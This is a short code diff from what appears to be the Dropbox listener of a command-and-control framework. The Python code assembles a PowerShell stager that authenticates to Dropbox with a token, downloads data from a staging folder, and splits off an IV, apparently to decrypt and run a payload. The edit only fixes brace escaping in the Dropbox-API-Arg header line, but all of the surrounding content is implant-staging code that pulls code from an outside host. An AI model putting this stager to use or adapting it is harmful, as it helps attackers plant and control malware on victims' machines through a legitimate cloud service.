@@ -269,7 +269,7 @@ class Listener(object):
                 # add in the Dropbox auth token and API params
                 stager += f"$t='{ api_token }';"
                 stager += '$wc.Headers.Add("Authorization","Bearer $t");'
-                stager += f'$wc.Headers.Add("Dropbox-API-Arg",\'{"path":"{ staging_folder }/debugps"}\');'
+                stager += f'$wc.Headers.Add("Dropbox-API-Arg",\'{{"path":"{ staging_folder }/debugps"}}\');'
 
                 stager += "$data=$wc.DownloadData('https://content.dropboxapi.com/2/files/download');"
                 stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
